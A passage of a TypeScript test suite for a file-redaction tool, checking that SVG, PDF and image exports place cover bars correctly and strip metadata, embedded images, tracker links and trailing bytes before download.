  for (const size of ['width="100%" height="100%"', 'width="40ex" height="30ex"', '']) {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" ${size} viewBox="0 0 800 600">
  <text x="380" y="300">SECRET</text>
</svg>`;
    const res = await hooks.exportFile({
      model: modelFor(fileRef('t.svg', 'image/svg+xml', svgBytes(svg)), { svgVector: true, style: 'solid', bars: [drawn(380, 280, 80, 40)] }),
      host: BARE_HOST,
    });
    const out = new TextDecoder().decode(res.bytes);
    // 380..460 inflated 2px → 378..462 (w 84), quantised UP to 96, centred →
    // 372..468; y 280..320 → 278..322. Mapped 1:1 into the viewBox.
    assert.match(out, /<rect x="372" y="278" width="96" height="44" fill="#14161a" fill-opacity="1"\/>/, size || '(no width/height)');
  }
});

test('redact: an absolute root size IS the natural size, and bars scale through it', async () => {
  const hooks = loadHooks();
  // 210mm is 793.7 natural pixels in an <img>, so the drawing surface reports a
  // 793.7-wide frame while the viewBox is 800 wide. Treating mm as "unresolvable"
  // put those two spaces 0.79% apart here, and 7.9x apart when the viewBox is
  // 100 — enough for a bar to cover a different part of the page with the gate
  // still green. Every absolute CSS unit has to resolve the way the browser does.
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="210mm" height="157.5mm" viewBox="0 0 800 600">'
    + '<text x="380" y="300">SECRET</text></svg>';
  const res = await hooks.exportFile({
    model: modelFor(fileRef('mm.svg', 'image/svg+xml', svgBytes(svg)), { svgVector: true, style: 'solid', bars: [drawn(380, 280, 80, 40)] }),
    host: BARE_HOST,
  });
  const out = new TextDecoder().decode(res.bytes);
  const m = /<rect x="([-\d.]+)" y="([-\d.]+)" width="([\d.]+)" height="([\d.]+)"/.exec(out);
  assert.ok(m, 'a bar rect was appended');
  const [x, y, w, h] = m!.slice(1).map(Number) as [number, number, number, number];
  // 793.7 natural px over an 800-unit viewBox: the same rect, divided by 0.9921.
  assert.ok(Math.abs(x - 372 / 0.992126) < 0.5, `x scaled through the natural size, got ${x}`);
  assert.ok(Math.abs(w - 96 / 0.992126) < 0.5, `width scaled through the natural size, got ${w}`);
  assert.ok(Math.abs(y - 278 / 0.992126) < 0.5, `y scaled through the natural size, got ${y}`);
  assert.ok(Math.abs(h - 44 / 0.992126) < 0.5, `height scaled through the natural size, got ${h}`);
});

test('redact: Illustrator data-name beside a kept id does not false-positive the gate', async () => {
  const hooks = loadHooks();
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">
  <g id="Layer_2" data-name="Layer 2"><text x="10" y="50">Account 4417</text></g>
</svg>`;
  const res = await hooks.exportFile({
    model: modelFor(fileRef('ai.svg', 'image/svg+xml', svgBytes(svg)), { svgVector: true }),
    host: BARE_HOST,
  });
  const out = new TextDecoder().decode(res.bytes);
  assert.match(out, /id="Layer_2"/);
  assert.doesNotMatch(out, /data-name/);
  assert.match(out, /Account 4417/);
});

test('redact: vector export removes title/desc, embedded data-URI images and external hrefs', async () => {
  const hooks = loadHooks();
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="100" viewBox="0 0 200 100">
  <title>quarterly figures draft</title>
  <desc>drawn from the payroll extract</desc>
  <image xlink:href="data:image/jpeg;base64,QUFBQUJCQkJDQ0ND" width="50" height="50"/>
  <a href="https://tracker.example/pixel"><text x="10" y="50">Keep me</text></a>
</svg>`;
  const res = await hooks.exportFile({
    model: modelFor(fileRef('mix.svg', 'image/svg+xml', svgBytes(svg)), { svgVector: true }),
    host: BARE_HOST,
  });
  const out = new TextDecoder().decode(res.bytes);
  assert.doesNotMatch(out, /<title|quarterly|payroll|<desc/);
  assert.doesNotMatch(out, /data:image|QUFBQUJCQkJDQ0ND|<image/);
  assert.doesNotMatch(out, /tracker\.example|https?:\/\/tracker/);
  assert.match(out, /Keep me/, 'the link text survives, only the external href goes');
});

// ─── PDF page previews (host.pdf.pages → pdfPages extras) ────────────────────

const pageSvg = (n: number): string =>
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 612 792"><text x="10" y="20">page ${n}</text></svg>`;

const TWO_PAGES = {
  pages: [
    { svg: pageSvg(1), page: 1, widthPt: 612, heightPt: 792 },
    { svg: pageSvg(2), page: 2, widthPt: 612, heightPt: 792 },
  ],
  truncated: false,
};

test('redact: pdfPages extras carry INLINE per-page SVG markup in PDF points', async () => {
  // The enabling change of this round: a page arrives as markup the template
  // inlines, NOT as an <img src="blob:…">. An SVG inside an <img> is a closed
  // document — nothing outside it can read a node's painted bounds — so
  // snap-to-cover, the partial-coverage warning and vector deletion would all
  // be impossible. The whole object-URL lifecycle (create, track, revoke on a
  // delay) went with it: there is nothing left to revoke.
  const hooks = loadHooks();
  const host = pdfHost({ pdf: { pages: async () => TWO_PAGES } });
  const res = await hooks.onInit({ model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC)), host });
  assert.equal(res.hasPdfPages, true);
  assert.equal(res.pagesPending, false);
  assert.equal(res.pagesTruncated, false);
  assert.equal(res.pagesError, '');
  assert.equal(res.pdfPages.length, 2);
  for (const [i, p] of res.pdfPages.entries()) {
    assert.equal(p.page, i + 1);
    assert.equal(p.w, 612);
    assert.equal(p.h, 792);
    assert.equal(p.url, undefined, 'no object URL is minted any more');
    assert.match(p.svg, /^<svg\b/, 'the page IS markup, ready to inline');
    assert.match(p.svg, /viewBox="0 0 612 792"/, 'the viewBox stays PDF points');
    assert.match(p.svg, /width="612" height="792"/, 'sized at the space bars are measured in');
    assert.match(p.svg, /class="rd-img"/);
    assert.match(p.svg, /data-rdsvg=""/, 'the scope hook the file\'s own CSS is rewritten under');
    assert.match(p.svg, new RegExp(`page ${i + 1}`));
    assert.match(p.svg, /<text[^>]*data-rdn="\d+"/, 'every element carries its token address');
  }
});

test('redact: a slow page render reports pagesPending, then a later pass picks up the cached result', async () => {
  const hooks = loadHooks();
  let resolvePages: (v: any) => void = () => {};
  const deferred = new Promise((r) => { resolvePages = r; });
  const host = pdfHost({ pdf: { pages: () => deferred } });
  const model = modelFor(fileRef('slow.pdf', 'application/pdf', PDF_SRC));

  // First pass: the job outlives the budget → pending, analysis still usable.
  const first = await hooks.onInit({ model, host });
  assert.equal(first.pagesPending, true);
  assert.equal(first.hasPdfPages, false);
  assert.equal(first.supported, true);

  // The job settles; the next pass (the template's poll re-committing bars)
  // reads the cached result synchronously — no second host.pdf.pages call.
  resolvePages(TWO_PAGES);
  await deferred;
  const second = await hooks.onInput({ id: 'bars', value: [], model, host });
  assert.equal(second.pagesPending, false);
  assert.equal(second.hasPdfPages, true);
  assert.equal(second.pdfPages.length, 2);
});

test('redact: a permanently failing analyze reports a terminal state once and never retries', async () => {
  const hooks = loadHooks();
  let calls = 0;
  const host = pdfHost({
    pdf: {
      analyze: async () => { calls++; throw new Error('encrypted'); },
      pages: async () => TWO_PAGES,
    },
  });
  const model = modelFor(fileRef('locked.pdf', 'application/pdf', PDF_SRC));
  const first = await hooks.onInit({ model, host });
  assert.equal(first.analysisFailed, true, 'the failure is a visible state, not eternal pending');
  assert.equal(first.analysisPending, false);
  assert.equal(first.nothingFound, false, 'a failed analysis never claims a clean bill');
  const second = await hooks.onInput({ id: 'bars', value: [], model, host });
  assert.equal(second.analysisFailed, true);
  assert.equal(calls, 1, 'the failing analyze is not retried on every input');
});

test('redact: pages the shell could not render are named in an advisory toast, not silently absent', async () => {
  const hooks = loadHooks();
  const host = pdfHost({
    pdf: { pages: async () => ({ ...TWO_PAGES, failed: [3] }) },
  });
  const res = await hooks.onInit({ model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC)), host });
  assert.equal(res.hasPdfPages, true);
  assert.match(res.toastKey, /^pages-failed@doc\.pdf:/, 'the toast key carries file identity');
  assert.match(res.toastText, /Page 3 could not be rendered/);
  assert.match(res.toastText, /export refuses to ship a page that fails to render/);

  const multi = await hooks.onInit({
    model: modelFor(fileRef('doc2.pdf', 'application/pdf', PDF_SRC)),
    host: pdfHost({ pdf: { pages: async () => ({ ...TWO_PAGES, failed: [3, 5] }) } }),
  });
  assert.match(multi.toastText, /Pages 3 and 5 could not be rendered/);
});

test('redact: an incomplete (zero-area) bars row survives the canvas round-trip JSON', async () => {
  const hooks = loadHooks();
  const bars = [{ page: 1, x: 5, y: 5, w: 0, h: 0 }, { page: 1, x: 10, y: 10, w: 40, h: 20 }];
  const res = await hooks.onInput({
    id: 'bars', value: bars,
    model: modelFor(fileRef('shot.png', 'image/png', buildDirtyPng()), { bars }),
    host: BARE_HOST,
  });
  const roundTrip = JSON.parse(res.barsJson);
  assert.equal(roundTrip.length, 2, 'the half-typed row stays in the canvas array');
  assert.deepEqual(roundTrip[0], { page: 1, x: 5, y: 5, w: 0, h: 0, n: '' });
  // But it never counts as a real bar anywhere else.
  assert.equal(res.barCount, 1);
  assert.equal(res.hasBars, true);
});

test('redact: a failed page render shows one sentence and keeps the analysis usable', async () => {
  const hooks = loadHooks();
  const host = pdfHost({
    pdf: {
      analyze: async () => ({ findings: [{ label: 'Author', detail: 'Jane', tone: 'warn' }] }),
      pages: async () => { throw new Error('renderer exploded'); },
    },
  });
  const res = await hooks.onInit({ model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC)), host });
  assert.equal(res.hasPdfPages, false);
  assert.equal(res.pagesPending, false);
  assert.match(res.pagesError, /could not be rendered/);
  assert.ok(findLabel(res.findings, 'Author'), 'analysis findings still surface');
});

// ─── end-to-end: real manifest + template through createRuntime ──────────────

test('redact (e2e): JPEG analysis renders GPS + trailing-bytes findings in the template', async () => {
  const rt = await createRuntime(redactTool(), BARE_HOST, {
    source: fileRef('beach.jpg', 'image/jpeg', buildGpsJpegWithTrailer()),
  });
  const html = rt.getHydrated();
  assert.match(html, /GPS location/);
  assert.match(html, /37\.80833, -122\.41667/);
  assert.match(html, /Data after end of image/);
  assert.match(html, /earlier un-cropped or un-redacted version/);
  // The reveal toggle exists and defaults OFF (no checked attribute).
  assert.match(html, /id="rd-show-details"/);
  assert.doesNotMatch(html, /id="rd-show-details"[^>]*\bchecked\b/);
  // Honest register: the limits section never claims SynthID detection.
  assert.match(html, /cannot detect or remove them/);
  assert.match(html, /Blurred text has been recovered in practice/);
});

test('redact (e2e): unsupported file renders guidance, not a crash', async () => {
  const rt = await createRuntime(redactTool(), BARE_HOST, {
    source: fileRef('notes.txt', 'text/plain', new TextEncoder().encode('just some text')),
  });
  assert.match(rt.getHydrated(), /doesn't look like a supported file/);
});

test('redact (e2e): PDF without host.pdf renders the unavailable branch', async () => {
  const rt = await createRuntime(redactTool(), BARE_HOST, {
    source: fileRef('doc.pdf', 'application/pdf', new TextEncoder().encode('%PDF-1.4\n1 0 obj\nendobj\n%%EOF\n')),
  });
  assert.match(rt.getHydrated(), /PDF redaction isn't available here\./);
});

test('redact (e2e): PDF pages render as frames in point space with the no-bars button disabled', async () => {
  const rt = await createRuntime(redactTool(), pdfHost({ pdf: { pages: async () => TWO_PAGES } }), {
    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC),
  });
  const html = rt.getHydrated();
  // One frame per page, coordinate space declared in PDF points.
  assert.match(html, /class="rd-frame rd-pageframe" data-page="1" data-ptw="612" data-pth="792"/);
  assert.match(html, /class="rd-frame rd-pageframe" data-page="2"/);
  assert.match(html, /Page 2<\/span>/);
  // Each page is INLINE svg in the frame, addressed for measurement — not an
  // <img src="blob:…">, which would be a closed document with no readable node
  // bounds and no snap-to-cover, warning or deletion on top of it.
  assert.match(html, /<svg[^>]*class="rd-img"[^>]*data-rdsvg=""/);
  assert.match(html, /<text[^>]*data-rdn="\d+"[^>]*>page 1<\/text>/);
  assert.doesNotMatch(html, /<img class="rd-img"/);
  // The stage element carries the empty bars array, the rail's preset map and
  // the geometry constants the canvas mirror needs.
  assert.match(html, /class="rd-stage" data-bars="\[\]" data-presets="/);
  assert.match(html, /data-geom="\{&quot;inflate&quot;:2/);
  // No bars yet: the download button is really disabled, with guidance as label.
  assert.match(html, /<button type="button" class="rd-download" data-export-file disabled>Draw a bar over what should go first<\/button>/);
});

test('redact (e2e): exportFile through the runtime returns verified SVG bytes', async () => {
  const rt = await createRuntime(redactTool(), BARE_HOST, {
    source: fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)),
    svgVector: true,
    bars: [drawn(20, 30, 50, 20)],
    style: 'solid',
  });
  const { bytes, mime, filename } = await rt.exportFile() as any;
  assert.equal(mime, 'image/svg+xml');
  assert.equal(filename, 'art-redacted.svg');
  const out = new TextDecoder().decode(bytes);
  assert.doesNotMatch(out, /<metadata|<script|hushtoken/);
  assert.match(out, /fill="#14161a" fill-opacity="1"/);
});

// ─── advisory toasts: dedupe per file, one at a time ─────────────────────────

test('redact: bar advisories fire one per edit, each key once per file, and a new file resets the slate', async () => {
  const hooks = loadHooks();
  const png = buildDirtyPng();
  const bars = [{ page: 1, x: 5, y: 5, w: 40, h: 20 }]; // 20px tall: not thin
  const model = modelFor(fileRef('shot.png', 'image/png', png), { bars });

  const first = await hooks.onInput({ id: 'bars', value: bars, model, host: BARE_HOST });
  assert.match(first.toastKey, /^first-bar@shot\.png:/, 'the DOM dedupe key carries file identity');
  assert.equal(first.toastText, 'Covered content is destroyed when the file is rebuilt, not hidden.');

  const second = await hooks.onInput({ id: 'bars', value: bars, model, host: BARE_HOST });
  assert.match(second.toastKey, /^image-mark@/, 'first-bar is spent, the image caveat takes the next edit');
  assert.match(second.toastText, /Whole-image watermarks survive partial cover/);

  const third = await hooks.onInput({ id: 'bars', value: bars, model, host: BARE_HOST });
  assert.equal(third.toastKey, '', 'no thin bar and every key seen: silence, never a repeat');
  assert.equal(third.toastText, '');

  // A different file starts a clean advisory slate.
  const other = modelFor(fileRef('other.png', 'image/png', png), { bars });
  const fresh = await hooks.onInput({ id: 'bars', value: bars, model: other, host: BARE_HOST });
  assert.match(fresh.toastKey, /^first-bar@other\.png:/);
});

test('redact: bar advisories only fire on a bars edit, never on an option toggle', async () => {
  const hooks = loadHooks();
  const bars = [{ page: 1, x: 5, y: 5, w: 40, h: 20 }];
  const model = modelFor(fileRef('shot.png', 'image/png', buildDirtyPng()), { bars });
  const res = await hooks.onInput({ id: 'quantise', value: false, model, host: BARE_HOST });
  assert.equal(res.toastKey, '', 'a quantise toggle with bars present stays quiet');
});

test('redact: the thin-bar advisory respects the per-space threshold (11px images, 8pt PDF)', async () => {
  const hooks = loadHooks();
  const png = buildDirtyPng();

  // Image space: 10px is under the 11px line.
  const thin = [{ page: 1, x: 5, y: 5, w: 40, h: 10 }];
  const model = modelFor(fileRef('thin.png', 'image/png', png), { bars: thin });
  await hooks.onInput({ id: 'bars', value: thin, model, host: BARE_HOST }); // first-bar
  await hooks.onInput({ id: 'bars', value: thin, model, host: BARE_HOST }); // image-mark
  const third = await hooks.onInput({ id: 'bars', value: thin, model, host: BARE_HOST });
  assert.match(third.toastKey, /^thin-bar@thin\.png:/);
  assert.equal(third.toastText, 'A very thin bar can hint at what it hides.');

  // PDF space: 10pt clears the 8pt line, so after first-bar there is nothing.
  const pdfBars = [{ page: 1, x: 10, y: 10, w: 40, h: 10 }];
  const pdfModel = modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), { bars: pdfBars });
  const host = pdfHost({ pdf: { pages: async () => TWO_PAGES } });
  const p1 = await hooks.onInput({ id: 'bars', value: pdfBars, model: pdfModel, host });
  assert.match(p1.toastKey, /^first-bar@doc\.pdf:/);
  const p2 = await hooks.onInput({ id: 'bars', value: pdfBars, model: pdfModel, host });
  assert.equal(p2.toastKey, '', 'a 10pt bar in PDF points is not thin and PDFs never get the image caveat');
});

// ─── preset bar heights: the fractions live in hooks.js, once ────────────────

test('redact: preset height fractions ship to the canvas as JSON from one source of truth', async () => {
  const hooks = loadHooks();
  const res = await hooks.onInit({
    model: modelFor(fileRef('shot.png', 'image/png', buildDirtyPng())),
    host: BARE_HOST,
  });
  const fr = JSON.parse(res.presetsJson);
  assert.deepEqual(Object.keys(fr).sort(), ['block', 'heading', 'line'], 'exactly the rail presets, free stays absent (0 = follow the drag)');
  assert.ok(fr.line > 0 && fr.line < fr.heading && fr.heading < fr.block && fr.block < 1,
    'line < heading < block, all sane fractions of the frame');
  // The template multiplies these against the frame's own space with a 6-unit
  // floor; on an A4 page (792pt) the line preset lands in text-line territory.
  const linePt = Math.max(6, Math.round(792 * fr.line));
  assert.ok(linePt >= 8 && linePt <= 24, `A4 line preset is text-line sized, got ${linePt}pt`);
  // The empty-state patch carries the same fractions so the stage script can
  // parse them on the very first paint after a drop.
  const blank = await hooks.onInit({ model: modelFor(null), host: BARE_HOST });
  assert.equal(blank.presetsJson, res.presetsJson);
});

// ─── the raster export gate ──────────────────────────────────────────────────
// Every image export ends in verifyRasterOutput(out, kind) + verifyBarsPainted.
// The first two are pure byte scans over the OUTPUT, and until now nothing
// pinned them: a regression that widened the JPEG APPn window (say, to tolerate
// a segment some browser adds) would have let real EXIF ship with the gate
// green. These lock the boundaries the gate actually depends on.

// One JPEG segment: FFxx + big-endian length + payload.
function jpegSeg(marker: number, payload: Uint8Array): Uint8Array {
  const len = payload.length + 2;
  const out = new Uint8Array(4 + payload.length);
  out[0] = 0xFF; out[1] = marker; out[2] = (len >> 8) & 0xFF; out[3] = len & 0xFF;
  out.set(payload, 4);
  return out;
}

const ascii = (s: string) => Uint8Array.from(s.split('').map((c) => c.charCodeAt(0)));

// SOI + the given segments + a minimal scan + EOI. Nothing past FFD9.
function jpegWith(...segs: Uint8Array[]): Uint8Array {
  return concat([
    Uint8Array.from([0xFF, 0xD8]),
    ...segs,
    Uint8Array.from([0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F, 0x00, 0xAA, 0xBB, 0xFF, 0xD9]),
  ]);
}

const JFIF = jpegSeg(0xE0, concat([ascii('JFIF\0'), Uint8Array.from([1, 1, 0, 0, 1, 0, 1, 0, 0])]));

function pngWith(...chunks: Uint8Array[]): Uint8Array {
  return concat([PNG_SIG, pngChunk('IHDR', ihdr(10, 10)), ...chunks, pngChunk('IDAT', Uint8Array.from([0, 1])), pngChunk('IEND', new Uint8Array(0))]);
}

// RIFF/WEBP carrying one named chunk plus a VP8 bitstream, sizes consistent.
function webpWith(fourcc: string, payload: Uint8Array): Uint8Array {
  const body = concat([
    ascii(fourcc), (() => { const b = new Uint8Array(4); new DataView(b.buffer).setUint32(0, payload.length, true); return b; })(),
    payload, payload.length & 1 ? new Uint8Array(1) : new Uint8Array(0),
    ascii('VP8 '), Uint8Array.from([4, 0, 0, 0, 1, 2, 3, 4]),
  ]);
  const head = new Uint8Array(12);
  const dv = new DataView(head.buffer);
  head.set(ascii('RIFF'), 0);
  dv.setUint32(4, 4 + body.length, true);
  head.set(ascii('WEBP'), 8);
  return concat([head, body]);
}

test('redact gate: a clean canvas JPEG passes, every metadata segment class fails', () => {
  const { residualRasterMetadata } = loadGate();

  // What a canvas re-encode actually produces: SOI, JFIF APP0, scan, EOI.
  assert.equal(residualRasterMetadata(jpegWith(JFIF), 'JPEG'), null,
    'APP0 JFIF is the encoder saying "this is a JPEG", not source data');

  // Safari stamps the display profile into canvas output; the source profile
  // never crosses the canvas, so an ICC APP2 is tolerated BY NAME.
  assert.equal(residualRasterMetadata(jpegWith(JFIF, jpegSeg(0xE2, concat([ascii('ICC_PROFILE\0'), new Uint8Array(8)]))), 'JPEG'), null);
  // ...but only when it really is one. An APP2 with any other payload fails.
  assert.match(residualRasterMetadata(jpegWith(JFIF, jpegSeg(0xE2, ascii('MPF\0secret'))), 'JPEG'), /APP2/);

  // The whole APP1..APPF window is a hard failure — this is the assertion that
  // stops anyone "just exempting" the segment a browser happens to add.
  for (let m = 0xE1; m <= 0xEF; m++) {
    const msg = residualRasterMetadata(jpegWith(JFIF, jpegSeg(m, ascii('Exif\0\0payload'))), 'JPEG');
    assert.match(String(msg), new RegExp(`APP${m - 0xE0}`), `APP${m - 0xE0} must fail the gate`);
  }
  assert.match(residualRasterMetadata(jpegWith(JFIF, jpegSeg(0xFE, ascii('a comment'))), 'JPEG'), /comment/);

  // The scan STOPS at SOS: bytes that look like markers inside entropy-coded
  // data are not segments, and treating them as such would fail valid output.
  const afterScan = concat([jpegWith(JFIF).subarray(0, jpegWith(JFIF).length - 2), jpegSeg(0xE1, ascii('Exif\0\0late')), Uint8Array.from([0xFF, 0xD9])]);
  assert.equal(residualRasterMetadata(afterScan, 'JPEG'), null, 'nothing past SOS is read as a metadata segment');
});

test('redact gate: PNG ancillary chunks that can carry content all fail', () => {
  const { residualRasterMetadata } = loadGate();
  assert.equal(residualRasterMetadata(pngWith(), 'PNG'), null, 'IHDR/IDAT/IEND only is what a canvas encode emits');
  // A colour profile is encoder output; the content-bearing chunks are not.
  assert.equal(residualRasterMetadata(pngWith(pngChunk('iCCP', ascii('p\0\0x'))), 'PNG'), null);
  for (const type of ['tEXt', 'zTXt', 'iTXt', 'eXIf', 'tIME', 'acTL', 'caBX']) {
    assert.match(String(residualRasterMetadata(pngWith(pngChunk(type, ascii('x'))), 'PNG')), new RegExp(type),
      `${type} must fail the gate`);
  }
});

test('redact gate: WebP metadata and animation chunks fail', () => {
  const { residualRasterMetadata } = loadGate();
  assert.equal(residualRasterMetadata(webpWith('ICCP', ascii('prof')), 'WebP'), null);
  for (const fourcc of ['EXIF', 'XMP ', 'ANIM', 'ANMF', 'C2PA', 'JUMB']) {
    assert.match(String(residualRasterMetadata(webpWith(fourcc, ascii('xx')), 'WebP')), new RegExp(fourcc.trim()),
      `${fourcc.trim()} must fail the gate`);
  }
});

test('redact gate: verifyRasterOutput throws sentences for residual metadata and for trailing bytes', () => {
  const { verifyRasterOutput } = loadGate();
  // Clean output passes silently, in all three families.
  verifyRasterOutput(jpegWith(JFIF), 'JPEG');
  verifyRasterOutput(pngWith(), 'PNG');
  verifyRasterOutput(webpWith('ICCP', ascii('prof')), 'WebP');

  assert.throws(() => verifyRasterOutput(jpegWith(JFIF, jpegSeg(0xE1, ascii('Exif\0\0x'))), 'JPEG'),
    /^Error: Verification failed: the output still carries a JPEG APP1 metadata segment\. Nothing was downloaded\.$/);
  assert.throws(() => verifyRasterOutput(pngWith(pngChunk('tEXt', ascii('a\0b'))), 'PNG'),
    /still carries a PNG tEXt chunk\. Nothing was downloaded\.$/);

  // The aCropalypse class, on our OWN output: anything past the terminator.
  assert.throws(() => verifyRasterOutput(concat([pngWith(), new Uint8Array(16).fill(0x41)]), 'PNG'),
    /bytes after the end of the image\. Nothing was downloaded\.$/);
  assert.throws(() => verifyRasterOutput(concat([jpegWith(JFIF), new Uint8Array(16).fill(0x41)]), 'JPEG'),
    /bytes after the end of the image\. Nothing was downloaded\.$/);
});

// ─── quantise is one mitigation, applied in every format ─────────────────────

test('redact: the quantise toggle reaches the PDF rebuild, in points', async () => {
  const hooks = loadHooks();
  const seen: any[] = [];
  const host = pdfHost({
    pdf: {
      redact: async (_b: Uint8Array, o: any) => { seen.push(o); return { bytes: new TextEncoder().encode('%PDF-1.4\n%%EOF\n'), pages: 3 }; },
      analyze: async () => ({ findings: [{ label: 'Pages', detail: '3', tone: '' }] }),
    },
  });
  // A 37pt bar over a short name is exactly the glyph-position hint the sidebar
  // claims to soften. The rebuild has no width grid of its own (barToPixels only
  // snaps and inflates), so if the hook hands bars over raw the toggle is a lie
  // on the ONE format where the attack is documented.
  const bars = [{ page: 1, x: 100, y: 50, w: 37, h: 12 }];
  const src = fileRef('doc.pdf', 'application/pdf', PDF_SRC);

  await hooks.exportFile({ model: modelFor(src, { bars }), host });
  const on = seen[0].bars[0];
  assert.equal(on.w % 18, 0, `width lands on the 18pt grid, got ${on.w}`);
  assert.ok(on.w >= 37, 'quantising only ever widens');
  assert.ok(on.x <= 100 && on.x + on.w >= 137, 'the original span stays fully inside the widened bar');

  // Quantise off still hands over the EFFECTIVE rect, not the raw one: the
  // preview draws the 2-unit inflation whatever the toggle says, and the rebuild
  // inflates by two DEVICE pixels (0.72pt at 200 dpi), so leaving the inflation
  // to the far side painted a bar several points narrower than the one on
  // screen — area the user watched go black, shipped readable.
  await hooks.exportFile({ model: modelFor(src, { bars, quantise: false }), host });
  assert.deepEqual(seen[1].bars, [{ page: 1, x: 98, y: 48, w: 41, h: 16 }],
    'off drops the width grid, never the inflation');
  // And the widened bar always contains the plain inflated one.
  assert.ok(on.x <= 98 && on.x + on.w >= 139, 'the quantised bar contains the effective rect');
});

// ─── SVG vector mode: the bar must land where the browser drew it ────────────

test('redact: an SVG sized in physical units maps bars from the browser natural size', async () => {
  const hooks = loadHooks();
  // 210mm is 793.7 natural pixels in an <img> (96 dpi), NOT 210 and not the
  // viewBox's 100. The drawing surface measures against naturalWidth, so if the
  // hook falls back to the viewBox the two spaces differ by 7.937x and the bar
  // covers a different region — silently, with the gate still passing.
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="210mm" height="105mm" viewBox="0 0 100 50">'
    + '<text x="5" y="20">SECRET</text></svg>';
  const S = 96 / 25.4 * 210 / 100; // natural px per viewBox unit
  // A bar the user drew over SECRET (viewBox x 5..50, y 10..25), committed in
  // natural pixels the way template.html's frameSpace() reports them.
  const bars = [drawn(Math.round(5 * S), Math.round(10 * S), Math.round(45 * S), Math.round(15 * S))];
  const out = new TextDecoder().decode(
    (await hooks.exportFile({
      model: modelFor(fileRef('mm.svg', 'image/svg+xml', svgBytes(svg)), { bars, svgVector: true, style: 'solid' }),
      host: BARE_HOST,
    })).bytes
  );
  const m = /<rect x="([-\d.]+)" y="([-\d.]+)" width="([\d.]+)" height="([\d.]+)"/.exec(out);
  assert.ok(m, 'a bar rect was appended');
  const [x, y, w, h] = m!.slice(1).map(Number) as [number, number, number, number];
  // Back in viewBox units, the rect must contain the text it was drawn over.
  assert.ok(x <= 5 && x + w >= 50, `covers the text horizontally, got x=${x} w=${w}`);
  assert.ok(y <= 12 && y + h >= 20, `covers the text vertically, got y=${y} h=${h}`);
  assert.ok(x + w <= 101, 'and does not sprawl past the page');
});

// ─── bars belonging to a document the user replaced ──────────────────────────

test('redact: bars left on other pages by a replaced PDF are reported, not silently burned away', async () => {
  const hooks = loadHooks();
  // `bars` is its own input and survives a source swap: redact a PDF, mark page
  // 3, then Replace with a photo. The UI used to report 3 bars while the export
  // burned 1, and every gate passed because it only ever inspected the rects
  // that placed.
  const res = await hooks.onInput({
    id: 'bars',
    model: modelFor(fileRef('shot.png', 'image/png', buildDirtyPng()), {
      bars: [{ page: 3, x: 10, y: 10, w: 40, h: 12 }, { page: 1, x: 0, y: 0, w: 20, h: 10 }],
    }),
    host: BARE_HOST,
  });
  assert.equal(res.barCount, 1, 'the count describes the page that exists');
  assert.match(res.coverageText, /^1 mark /);
  assert.match(res.staleNote, /replaced/);
  assert.match(res.staleNote, /dropped from the export/);
  assert.equal(res.staleBars, 1);
});

// ─── node geometry: snap-to-cover, partial coverage (pure, no DOM) ───────────
// The sandboxed hook cannot compute glyph geometry, so the canvas script
// measures and the hook owns the maths. These pin the maths; the mirror test
// below pins the two copies against each other.

const box = (x: number, y: number, w: number, h: number) => ({ x, y, w, h });

test('redact geom: a bar grows to the union of the nodes it is over — ONCE, not to a fixed point', () => {
  const { snapBarToNodes } = loadGeom();

  // The case Andy hit in the browser: a strikethrough-height bar across a word
  // whose ascenders and descenders stick out. The bar must swallow the glyph
  // box, not clip it.
  const glyphs = box(10, 10, 60, 30);
  const strike = { x: 20, y: 22, w: 30, h: 4 };
  const snapped = snapBarToNodes(strike, [glyphs]);
  assert.deepEqual(
    { x: snapped.x, y: snapped.y, w: snapped.w, h: snapped.h },
    { x: 10, y: 10, w: 60, h: 30 },
    'the bar contains the whole glyph box'
  );
  assert.deepEqual(snapped.hit, [0]);

  // THE BOUND, and the defect it fixes. Growth used to be transitive: reaching
  // node 0 made the bar reach node 1, then 2, and on a real page of body text
  // that is a flood fill — a 20x20pt bar came back 455x286pt, and the requested
  // width was discarded entirely. Only what the ORIGINAL rectangle is over
  // counts, so the chain is cut at the first link.
  const chain = snapBarToNodes({ x: 0, y: 0, w: 2, h: 2 }, [
    box(1, 1, 20, 5),   // the drawn box is over this one
    box(21, 1, 20, 5),  // only reachable once the bar has grown out to 21
    box(200, 200, 5, 5) // never reachable
  ]);
  assert.equal(chain.x + chain.w, 21, 'grew to node 0 and stopped');
  assert.deepEqual(chain.hit, [0], 'node 1 only ABUTS the grown box, so it is not even addressed');

  // Two bars at the same point with different widths must stay different. This
  // is the user-visible half of the defect: once text was touched, the drag was
  // thrown away and both produced byte-identical output.
  const nodes = [box(10, 0, 10, 8), box(24, 0, 10, 8), box(38, 0, 10, 8)];
  const narrow = snapBarToNodes({ x: 12, y: 2, w: 4, h: 4 }, nodes);
  const wide = snapBarToNodes({ x: 12, y: 2, w: 30, h: 4 }, nodes);
  assert.deepEqual(narrow.hit, [0], 'the narrow bar takes the word it is over');
  assert.deepEqual(wide.hit, [0, 1, 2], 'the wide bar takes the three it is over');
  assert.notDeepEqual(
    { x: narrow.x, w: narrow.w }, { x: wide.x, w: wide.w },
    'the requested width still decides the result'
  );

  // Nothing to snap to (a raster source has no nodes at all) leaves the drawn
  // bar exactly as drawn.
  const alone = snapBarToNodes({ x: 5, y: 6, w: 7, h: 8 }, []);
  assert.deepEqual({ x: alone.x, y: alone.y, w: alone.w, h: alone.h }, box(5, 6, 7, 8));
  assert.deepEqual(alone.hit, []);
});

test('redact geom: abutting line boxes do not chain — the paragraph cascade', () => {
  const { snapBarToNodes, effBox, rectTouches, rectOverlaps } = loadGeom();
  const W = 600, H = 800;

  // Body text as a page really presents it: line boxes whose bottom edge IS the
  // next line's top edge, each split into word runs that abut left to right.
  // Every one of these pairs "touches" its neighbour, which is exactly how a
